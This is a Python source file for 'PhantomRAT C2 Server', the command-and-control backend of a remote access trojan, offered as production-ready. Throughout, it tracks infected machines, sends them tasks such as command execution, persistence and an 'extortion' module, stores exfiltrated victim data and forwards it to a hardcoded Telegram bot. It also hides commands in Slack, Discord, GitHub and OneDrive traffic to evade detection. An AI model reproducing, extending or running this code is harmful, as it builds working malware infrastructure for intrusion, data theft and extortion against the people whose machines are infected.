#!/usr/bin/env python3
"""
PhantomRAT C2 Server v3.0
Production-ready command and control server with encryption, authentication, and API.
"""

import json
import time
import sqlite3
import hashlib
import base64
import os
import threading
from flask import Flask, request, jsonify, render_template, redirect, url_for, session, g
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
from functools import wraps
import requests
import random
import ssl

app = Flask(__name__)
app.config['SECRET_KEY'] = 'e4850f012d54d170077a91b8f02e60ca64e6a2c7a6d5bad5'
app.config['DATABASE'] = 'phantom_c2.db'
app.config['SESSION_TYPE'] = 'filesystem'

# Load profile
with open('malleable_profile.json', 'r') as f:
    PROFILE = json.load(f)

ENCRYPTION_KEY = b"phantomrat_32_char_encryption_key_here"
FERNET_KEY = base64.urlsafe_b64encode(hashlib.sha256(ENCRYPTION_KEY).digest())
CIPHER = Fernet(FERNET_KEY)

BOT_TOKEN = '8441637477:AAF4yVWTmXniWE8WYdkLiS5WAsd0vE43qk4'
CHAT_ID = '7279310150'

# Legitimate service tokens (placeholders - replace with real)
MS_GRAPH_TOKEN = os.environ.get('MS_GRAPH_TOKEN', 'placeholder_token')
SLACK_TOKEN = os.environ.get('SLACK_TOKEN', 'placeholder_token')
DISCORD_TOKEN = os.environ.get('DISCORD_TOKEN', 'placeholder_token')
GITHUB_TOKEN = os.environ.get('GITHUB_TOKEN', 'placeholder_token')

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(app.config['DATABASE'])
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        db.executescript('''
            CREATE TABLE IF NOT EXISTS implants (
                id TEXT PRIMARY KEY,
                os TEXT,
                hostname TEXT,
                ip TEXT,
                last_seen TEXT,
                status TEXT DEFAULT 'active'
            );
            
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                implant_id TEXT,
                command TEXT,
                arguments TEXT,
                status TEXT DEFAULT 'pending',
                created_at TEXT,
                delivered_at TEXT,
                completed_at TEXT,
                result TEXT
            );
            
            CREATE TABLE IF NOT EXISTS exfil (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                implant_id TEXT,
                data TEXT,
                timestamp TEXT DEFAULT CURRENT_TIMESTAMP
            );
            
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                level TEXT,
                message TEXT,
                source TEXT,
                timestamp TEXT DEFAULT CURRENT_TIMESTAMP
            );
            
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE,
                password_hash TEXT,
                role TEXT DEFAULT 'user',
                last_login TEXT
            );
        ''')
        
        # Create default admin user with PBKDF2
        password = "phantom123"
        salt = b'phantom_salt_1234567890123456'
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        hashed = key.decode()
        
        db.execute('INSERT OR IGNORE INTO users (username, password_hash) VALUES (?, ?)', ('admin', hashed))
        db.commit()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def encrypt_data(data):
    return CIPHER.encrypt(json.dumps(data).encode())

def decrypt_data(data):
    try:
        return json.loads(CIPHER.decrypt(data).decode())
    except:
        return None

def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': CHAT_ID, 'text': message}
        requests.post(url, data=data)
    except:
        pass

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        db = get_db()
        user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        if user:
            stored_hash = user['password_hash']
            salt = b'phantom_salt_1234567890123456'
            kdf = PBKDF2HMAC(
                algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
            )
            key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
            if key.decode() == stored_hash:
                session['username'] = username
                return redirect(url_for('dashboard'))
        
        return 'Invalid credentials'
    
    return '''
    <form method="post">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
    '''

@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    db = get_db()
    implants = db.execute('SELECT * FROM implants ORDER BY last_seen DESC').fetchall()
    tasks = db.execute('SELECT * FROM tasks ORDER BY created_at DESC LIMIT 10').fetchall()
    active_count = db.execute('SELECT COUNT(*) FROM implants WHERE status = ?', ('active',)).fetchone()[0]
    pending_count = db.execute('SELECT COUNT(*) FROM tasks WHERE status = ?', ('pending',)).fetchone()[0]
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>PhantomRAT Dashboard</title>
        <style>
            body {{ font-family: Arial, sans-serif; margin: 20px; }}
            .stats {{ background: #f0f0f0; padding: 10px; margin-bottom: 20px; }}
            table {{ border-collapse: collapse; width: 100%; }}
            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
            th {{ background-color: #f2f2f2; }}
            .task-form {{ margin-bottom: 20px; }}
        </style>
    </head>
    <body>
        <nav><a href="/dashboard">Dashboard</a> | <a href="/tasks">Tasks</a> | <a href="/exfil">Exfil</a> | <a href="/modules">Modules</a></nav>
        <h1>PhantomRAT C2 Dashboard</h1>
        <div class="stats">
            <h2>Statistics</h2>
            <p>Active Implants: {active_count}</p>
            <p>Pending Tasks: {pending_count}</p>
        </div>
        
        <h2>Active Implants</h2>
        <table>
            <tr><th>ID</th><th>OS</th><th>Hostname</th><th>IP</th><th>Last Seen</th></tr>
            {''.join(f"<tr><td>{i['id']}</td><td>{i['os']}</td><td>{i['hostname']}</td><td>{i['ip']}</td><td>{time.ctime(i['last_seen'])}</td></tr>" for i in implants)}
        </table>
        
        <h2>Recent Tasks</h2>
        <table>
            <tr><th>ID</th><th>Implant</th><th>Command</th><th>Status</th><th>Created</th></tr>
            {''.join(f"<tr><td>{t['id']}</td><td>{t['implant_id']}</td><td>{t['command']}</td><td>{t['status']}</td><td>{time.ctime(t['created_at'])}</td></tr>" for t in tasks)}
        </table>
        
        <div class="task-form">
            <h2>Quick Task</h2>
            <form action="/upload_task" method="post">
                Implant ID: <input type="text" name="implant_id" placeholder="Implant ID" required><br>
                Command: <select name="cmd">
                    <option value="sysinfo">System Info</option>
                    <option value="network_scan">Network Scan</option>
                    <option value="execute">Execute Command</option>
                    <option value="ping">Ping</option>
                    <option value="persistence">Add Persistence</option>
                    <option value="iot_scan">IoT Scan</option>
                    <option value="deliver_lure">Deliver Lure</option>
                </select><br>
                Arguments: <input type="text" name="args" placeholder="Args"><br>
                <button type="submit">Send Task</button>
            </form>
        </div>
        
        <a href="/logout">Logout</a>
    </body>
    </html>
    """
    return html

@app.route('/tasks')
@login_required
def tasks_page():
    db = get_db()
    tasks = db.execute('SELECT * FROM tasks ORDER BY created_at DESC').fetchall()
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Tasks - PhantomRAT</title>
    <style>
        body {{ font-family: Arial; margin: 20px; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; }}
        th {{ background: #f2f2f2; }}
        nav {{ margin-bottom: 20px; }}
    </style>
</head>
<body>
    <nav><a href="/dashboard">Dashboard</a> | <a href="/tasks">Tasks</a> | <a href="/exfil">Exfil</a> | <a href="/modules">Modules</a></nav>
    <h1>Task Management</h1>
    <table>
        <tr><th>ID</th><th>Implant</th><th>Command</th><th>Args</th><th>Status</th><th>Created</th><th>Result</th></tr>
        {''.join(f"<tr><td>{t['id']}</td><td>{t['implant_id']}</td><td>{t['command']}</td><td>{t['arguments']}</td><td>{t['status']}</td><td>{time.ctime(t['created_at'])}</td><td>{t['result'] or ''}</td></tr>" for t in tasks)}
    </table>
</body>
</html>
"""
    return html

@app.route('/exfil')
@login_required
def exfil_page():
    db = get_db()
    exfils = db.execute('SELECT * FROM exfil ORDER BY timestamp DESC LIMIT 50').fetchall()
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Exfiltrated Data - PhantomRAT</title>
    <style>
        body {{ font-family: Arial; margin: 20px; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; }}
        th {{ background: #f2f2f2; }}
        nav {{ margin-bottom: 20px; }}
        pre {{ max-width: 400px; overflow: hidden; text-overflow: ellipsis; }}
    </style>
</head>
<body>
    <nav><a href="/dashboard">Dashboard</a> | <a href="/tasks">Tasks</a> | <a href="/exfil">Exfil</a> | <a href="/modules">Modules</a></nav>
    <h1>Exfiltrated Data</h1>
    <table>
        <tr><th>ID</th><th>Implant</th><th>Data</th><th>Timestamp</th></tr>
        {''.join(f"<tr><td>{e['id']}</td><td>{e['implant_id']}</td><td><pre>{e['data'][:200]}...</pre></td><td>{e['timestamp']}</td></tr>" for e in exfils)}
    </table>
</body>
</html>
"""
    return html

@app.route('/modules')
@login_required
def modules_page():
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>Module Controls - PhantomRAT</title>
    <style>
        body {{ font-family: Arial; margin: 20px; }}
        nav {{ margin-bottom: 20px; }}
        form {{ margin-bottom: 20px; border: 1px solid #ccc; padding: 10px; }}
    </style>
</head>
<body>
    <nav><a href="/dashboard">Dashboard</a> | <a href="/tasks">Tasks</a> | <a href="/exfil">Exfil</a> | <a href="/modules">Modules</a></nav>
    <h1>Module Controls</h1>
    <form action="/upload_task" method="post">
        <h3>Send Task to Implant</h3>
        Implant ID: <input type="text" name="implant_id" required><br>
        Command: <select name="cmd">
            <option value="sysinfo">System Info</option>
            <option value="network_scan">Network Scan</option>
            <option value="execute">Execute Command</option>
            <option value="ping">Ping</option>
            <option value="persistence">Add Persistence</option>
            <option value="iot_scan">IoT Scan</option>
            <option value="deliver_lure">Deliver Lure</option>
            <option value="ai_generate">AI Generate</option>
            <option value="custom_encrypt">Custom Encrypt</option>
            <option value="extortion">Perform Extortion</option>
        </select><br>
        Arguments: <input type="text" name="args" placeholder="Args"><br>
        <button type="submit">Send Task</button>
    </form>
    <form action="/upload_task" method="post">
        <h3>Extortion Module</h3>
        Implant ID: <input type="text" name="implant_id" required><br>
        <input type="hidden" name="cmd" value="extortion">
        Target Dir: <input type="text" name="args" value="/home/user" placeholder="Directory"><br>
        <button type="submit">Trigger Extortion</button>
    </form>
    <!-- Add more module forms as needed -->
</body>
</html>
"""
    return html

@app.route('/phantom/beacon', methods=['POST'])
def beacon():
    try:
        data = decrypt_data(request.data)
        if not data:
            return '', 400
        
        implant_id = data['id']
        db = get_db()
        db.execute('INSERT OR REPLACE INTO implants (id, os, hostname, ip, last_seen) VALUES (?, ?, ?, ?, ?)',
                  (implant_id, data['os'], data['hostname'], data['ip'], data['timestamp']))
        
        # Get pending tasks
        tasks = db.execute('SELECT * FROM tasks WHERE implant_id = ? AND status = ?', (implant_id, 'pending')).fetchall()
        for task in tasks:
            db.execute('UPDATE tasks SET status = ?, delivered_at = ? WHERE id = ?', ('delivered', time.time(), task['id']))
        
        db.commit()
        
        if tasks:
            return encrypt_data([dict(task) for task in tasks])
        else:
            return encrypt_data([])
    except:
        return '', 400

@app.route('/phantom/exfil', methods=['POST'])
def exfil():
    if request.headers.get('User-Agent') != PROFILE['security']['user_agent']:
        return '', 403
    
    try:
        data = decrypt_data(request.data)
        if not data:
            return '', 400
        
        implant_id = data['id']
        exfil_data = data['data']
        
        db = get_db()
        # Update task result if it's a response
        if 'task_id' in data:
            db.execute('UPDATE tasks SET status = ?, completed_at = ?, result = ? WHERE id = ?',
                      ('completed', time.time(), json.dumps(exfil_data), data['task_id']))
        
        db.commit()
        # Store exfil data
        db.execute('INSERT INTO exfil (implant_id, data) VALUES (?, ?)', (implant_id, json.dumps(exfil_data)))
        db.commit()
        send_telegram(f"Exfil from {implant_id}: {json.dumps(exfil_data)[:100]}...")
        return '', 200
    except:
        return '', 400

@app.route('/api/stats')
@login_required
def api_stats():
    db = get_db()
    active_implants = db.execute('SELECT COUNT(*) FROM implants WHERE status = ?', ('active',)).fetchone()[0]
    pending_tasks = db.execute('SELECT COUNT(*) FROM tasks WHERE status = ?', ('pending',)).fetchone()[0]
    return jsonify({'active_implants': active_implants, 'pending_tasks': pending_tasks})

@app.route('/api/implants')
@login_required
def api_implants():
    db = get_db()
    implants = db.execute('SELECT * FROM implants ORDER BY last_seen DESC').fetchall()
    return jsonify([dict(implant) for implant in implants])

@app.route('/upload_task', methods=['POST'])
@login_required
def upload_task():
    implant_id = request.form.get('implant_id')
    cmd = request.form.get('cmd')
    args = request.form.get('args', '')

    db = get_db()
    db.execute('INSERT INTO tasks (implant_id, command, arguments, created_at) VALUES (?, ?, ?, ?)',
              (implant_id, cmd, args, time.time()))
    db.commit()
    # Also send via legit API
    send_command_via_legit_api(implant_id, cmd, args)
    return redirect(url_for('dashboard'))

def send_command_via_legit_api(implant_id, command, args=''):
    """Send commands via legitimate APIs"""
    # Randomly choose service
    services = ['msgraph', 'slack', 'discord', 'github']
    service = random.choice(services)

    if service == 'msgraph':
        # Hide command in OneDrive file metadata
        headers = {'Authorization': f'Bearer {MS_GRAPH_TOKEN}'}
        data = {'name': f'phantom_cmd_{implant_id}.txt', 'description': CIPHER.encrypt(json.dumps({'cmd': command, 'args': args}).encode()).decode()}
        try:
            resp = requests.post('https://graph.microsoft.com/v1.0/me/drive/root/children', json=data, headers=headers)
            if resp.status_code == 201:
                return True
        except:
            pass

    elif service == 'slack':
        # Post command as message in channel
        headers = {'Authorization': f'Bearer {SLACK_TOKEN}', 'Content-Type': 'application/json'}
        data = {'channel': '#phantom-c2', 'text': f'CMD for {implant_id}: {CIPHER.encrypt(json.dumps({"cmd": command, "args": args}).encode()).decode()}'}
        try:
            resp = requests.post('https://slack.com/api/chat.postMessage', json=data, headers=headers)
            if resp.json().get('ok'):
                return True
        except:
            pass

    elif service == 'discord':
        # Similar to slack
        headers = {'Authorization': f'Bot {DISCORD_TOKEN}', 'Content-Type': 'application/json'}
        data = {'content': f'Phantom CMD: {CIPHER.encrypt(json.dumps({"cmd": command, "args": args}).encode()).decode()}'}
        try:
            resp = requests.post('https://discord.com/api/channels/CHANNEL_ID/messages', json=data, headers=headers)
            if resp.status_code == 200:
                return True
        except:
            pass

    elif service == 'github':
        # Hide in GitHub issue comment
        headers = {'Authorization': f'token {GITHUB_TOKEN}', 'Accept': 'application/vnd.github.v3+json'}
        data = {'body': f'Phantom task: {CIPHER.encrypt(json.dumps({"cmd": command, "args": args}).encode()).decode()}'}
        try:
            resp = requests.post('https://api.github.com/repos/OWNER/REPO/issues/ISSUE_NUMBER/comments', json=data, headers=headers)
            if resp.status_code == 201:
                return True
        except:
            pass

    return False

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='PhantomRAT C2 Server')
    parser.add_argument('--host', '-i', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', '-p', type=int, default=5000, help='Port to listen on')
    parser.add_argument('--init', action='store_true', help='Initialize database')
    
    args = parser.parse_args()
    
    if args.init:
        init_db()
    else:
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        # For production, load proper certs: context.load_cert_chain('cert.pem', 'key.pem')
        # For now, use adhoc self-signed
        app.run(host=args.host, port=args.port, debug=False, ssl_context='adhoc')
